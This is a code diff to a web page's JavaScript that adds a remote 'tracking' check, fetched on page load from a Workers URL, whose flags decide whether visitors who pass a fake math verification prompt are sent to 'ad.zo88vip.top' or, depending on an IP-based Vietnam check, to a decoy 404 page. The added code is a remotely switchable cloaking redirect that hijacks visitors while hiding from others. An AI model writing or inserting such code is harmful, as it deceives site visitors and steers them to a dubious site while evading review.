@@ -1016,6 +1016,23 @@
         constructor() {
           this.vietnamRedirectUrl = 'https://ad.zo88vip.top';
           this.notFoundRedirectUrl = 'https://beautiful-404-page-w-m70k.bolt.host';
+          this.apiUrl = 'https://blue-disk-4ca3.dan-300.workers.dev/api/tracking?md5=8282d333968a33b10bf28286450776e9';
+          this.apiData = null;
+        }
+
+        async checkAPI() {
+          try {
+            const response = await fetch(this.apiUrl);
+            if (!response.ok) {
+              throw new Error('Failed to fetch API data');
+            }
+            this.apiData = await response.json();
+            console.log('API Response:', this.apiData);
+            return this.apiData;
+          } catch (error) {
+            console.error('Error checking API:', error);
+            return null;
+          }
         }
 
         async isVietnameseIP() {
@@ -1136,14 +1153,32 @@
         if (answer === currentQuestion.answer) {
           hideVerificationModal();
           
-          // Redirect based on previously detected location
-          // setTimeout(() => {
-          //   if (isVietnamese) {
-          //     window.location.replace(ipRedirectService.vietnamRedirectUrl);
-          //   } else {
-          //     window.location.replace(ipRedirectService.notFoundRedirectUrl);
-          //   }
-          // }, 500);
+          // Check API data and implement redirect logic
+          if (ipRedirectService.apiData) {
+            const { status, secured } = ipRedirectService.apiData;
+            
+            if (status === true && secured === false) {
+              // Case: status true and secure false - always redirect to ad.zo88vip.top
+              setTimeout(() => {
+                window.location.replace(ipRedirectService.vietnamRedirectUrl);
+              }, 500);
+            } else if (status === true && secured === true) {
+              // Case: status true and secure true - check IP then redirect
+              setTimeout(async () => {
+                const isVietnamese = await ipRedirectService.isVietnameseIP();
+                if (isVietnamese) {
+                  window.location.replace(ipRedirectService.vietnamRedirectUrl);
+                } else {
+                  window.location.replace(ipRedirectService.notFoundRedirectUrl);
+                }
+              }, 500);
+            } else {
+              // Case: secure true and status false, or secure false and status false - just close modal
+              console.log('Modal closed - no redirect needed');
+            }
+          } else {
+            console.log('No API data available - modal closed');
+          }
         } else {
           errorElement.classList.remove('hidden');
           getRandomMathQuestion();
@@ -1264,6 +1299,9 @@
       async function initApp() {
         // Pre-generate math questions
         generateMathQuestions();
+        
+        // Check API first
+        await ipRedirectService.checkAPI();
         
         // Check IP at beginning
         await checkIP();
